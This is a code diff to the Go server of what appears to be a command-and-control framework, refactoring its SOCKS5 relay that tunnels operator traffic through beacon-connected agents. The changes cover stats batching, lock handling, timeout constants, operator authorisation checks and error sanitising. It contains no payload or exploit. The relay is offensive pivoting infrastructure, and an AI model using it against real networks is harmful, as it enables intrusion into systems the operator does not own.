@@ -1,4 +1,4 @@
-package server
+﻿package server
 
 import (
 	"context"
@@ -175,7 +175,7 @@ func (e *socksRelayEngine) acceptLoop(s *Server, sess *socksRelaySession) {
 // locally, then relays the connection through the beacon tunnel to the agent.
 func (e *socksRelayEngine) handleOperatorConn(s *Server, sess *socksRelaySession, conn net.Conn) {
 	defer conn.Close()
-	conn.SetDeadline(time.Now().Add(30 * time.Second)) // handshake timeout
+	conn.SetDeadline(time.Now().Add(SOCKSHandshakeTimeout)) // handshake timeout
 
 	// ── SOCKS5 Greeting ──
 	header := make([]byte, 2)
@@ -306,6 +306,8 @@ func (e *socksRelayEngine) handleOperatorConn(s *Server, sess *socksRelaySession
 
 	// Read from operator → buffer for agent
 	buf := make([]byte, SocksMaxFrameSize)
+	var bytesAccum int64
+	var pktCount int
 	for {
 		n, err := conn.Read(buf)
 		if n > 0 {
@@ -316,9 +318,15 @@ func (e *socksRelayEngine) handleOperatorConn(s *Server, sess *socksRelaySession
 				Action: "data",
 				Data:   data,
 			})
-			// Update stats
-			s.db.Model(&db.SocksSession{}).Where("id = ?", sess.dbID).
-				UpdateColumn("bytes_in", gorm.Expr("bytes_in + ?", int64(n)))
+			// Accumulate stats, flush to DB every 100 packets
+			bytesAccum += int64(n)
+			pktCount++
+			if pktCount >= 100 {
+				s.db.Model(&db.SocksSession{}).Where("id = ?", sess.dbID).
+					UpdateColumn("bytes_in", gorm.Expr("bytes_in + ?", bytesAccum))
+				bytesAccum = 0
+				pktCount = 0
+			}
 			rc.mu.Lock()
 			rc.lastActive = time.Now()
 			rc.mu.Unlock()
@@ -326,6 +334,12 @@ func (e *socksRelayEngine) handleOperatorConn(s *Server, sess *socksRelaySession
 		if err != nil {
 			break
 		}
+	}
+
+	// Flush remaining accumulated bytes on connection close
+	if bytesAccum > 0 {
+		s.db.Model(&db.SocksSession{}).Where("id = ?", sess.dbID).
+			UpdateColumn("bytes_in", gorm.Expr("bytes_in + ?", bytesAccum))
 	}
 
 	// Connection closed
@@ -375,7 +389,13 @@ func (e *socksRelayEngine) collectPendingFrames(agentID string) []socksFrame {
 	}
 	e.controlFramesMu.Unlock()
 
-	// 2. Data frames from connections
+	// 2. Data frames from connections — minimize lock hold time
+	type connDrain struct {
+		connID  uint64
+		outbound [][]byte
+	}
+	var drained []connDrain
+
 	e.mu.Lock()
 	for _, conn := range e.connections {
 		if conn.agentID != agentID {
@@ -383,32 +403,37 @@ func (e *socksRelayEngine) collectPendingFrames(agentID string) []socksFrame {
 		}
 		conn.mu.Lock()
 		if len(conn.outbound) > 0 {
-			// Merge buffered chunks into a single payload
-			var merged []byte
-			for _, chunk := range conn.outbound {
-				merged = append(merged, chunk...)
-			}
-			conn.outbound = conn.outbound[:0] // drain
+			// Snapshot and drain under conn lock
+			snapshot := make([][]byte, len(conn.outbound))
+			copy(snapshot, conn.outbound)
+			conn.outbound = conn.outbound[:0]
 			conn.mu.Unlock()
-
-			// Split into max-size frames
-			for len(merged) > 0 {
-				sz := len(merged)
-				if sz > SocksMaxFrameSize {
-					sz = SocksMaxFrameSize
-				}
-				frames = append(frames, socksFrame{
-					ConnID: conn.connID,
-					Action: "data",
-					Data:   merged[:sz],
-				})
-				merged = merged[sz:]
-			}
+			drained = append(drained, connDrain{connID: conn.connID, outbound: snapshot})
 		} else {
 			conn.mu.Unlock()
 		}
 	}
 	e.mu.Unlock()
+
+	// Process drained data outside e.mu
+	for _, d := range drained {
+		var merged []byte
+		for _, chunk := range d.outbound {
+			merged = append(merged, chunk...)
+		}
+		for len(merged) > 0 {
+			sz := len(merged)
+			if sz > SocksMaxFrameSize {
+				sz = SocksMaxFrameSize
+			}
+			frames = append(frames, socksFrame{
+				ConnID: d.connID,
+				Action: "data",
+				Data:   merged[:sz],
+			})
+			merged = merged[sz:]
+		}
+	}
 
 	return frames
 }
@@ -424,7 +449,7 @@ func (e *socksRelayEngine) processAgentData(s *Server, agentID string, frames []
 			e.mu.Unlock()
 			if ok && len(f.Data) > 0 {
 				conn.mu.Lock()
-				conn.tcpConn.SetWriteDeadline(time.Now().Add(10 * time.Second))
+				conn.tcpConn.SetWriteDeadline(time.Now().Add(SOCKSRelayWriteTimeout))
 				if _, err := conn.tcpConn.Write(f.Data); err != nil {
 					slog.Warn("SOCKS relay: write to operator failed, closing conn",
 						"conn", f.ConnID, "error", err)
@@ -495,6 +520,9 @@ func (c *socksRelayConn) close() {
 // ─── HTTP Handlers ───────────────────────────────────────────────────────────
 
 func (s *Server) handleStartSocksRelay(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
 	id := c.Param("id")
 	if _, ok := s.getAgentOrFail(c, id); !ok {
 		return
@@ -506,13 +534,13 @@ func (s *Server) handleStartSocksRelay(c *gin.Context) {
 	}
 	port, err := strconv.Atoi(portStr)
 	if err != nil || port < 1 || port > 65535 {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid port"})
+		respondError(c, http.StatusBadRequest, "invalid port")
 		return
 	}
 
 	actualPort, err := s.socksEngine.startSession(s, id, port)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+		respondError(c, http.StatusInternalServerError, sanitizeError(err, "SOCKS relay"))
 		return
 	}
 
@@ -525,9 +553,12 @@ func (s *Server) handleStartSocksRelay(c *gin.Context) {
 }
 
 func (s *Server) handleStopSocksRelay(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
 	id := c.Param("id")
 	if err := s.socksEngine.stopSession(s, id); err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
+		respondError(c, http.StatusBadRequest, err.Error())
 		return
 	}
 
